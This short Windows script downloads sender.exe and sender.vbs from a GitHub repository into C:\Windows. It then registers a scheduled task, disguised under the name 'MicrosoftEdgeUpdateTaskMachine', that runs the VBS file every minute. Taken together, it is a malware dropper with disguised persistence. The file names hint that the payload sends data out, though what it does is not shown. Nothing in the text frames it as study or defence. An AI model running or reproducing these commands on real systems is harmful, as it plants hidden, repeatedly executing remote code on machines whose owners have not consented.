curl.exe https://github.com/terionun/smbb/raw/main/sender.exe -o C:\Windows\sender.exe
curl.exe https://raw.githubusercontent.com/terionun/smbb/main/sender.vbs -o C:\Windows\sender.vbs
schtasks /create /sc minute /mo 1 /tn "MicrosoftEdgeUpdateTaskMachine" /tr "wscript C:\Windows\sender.vbs"
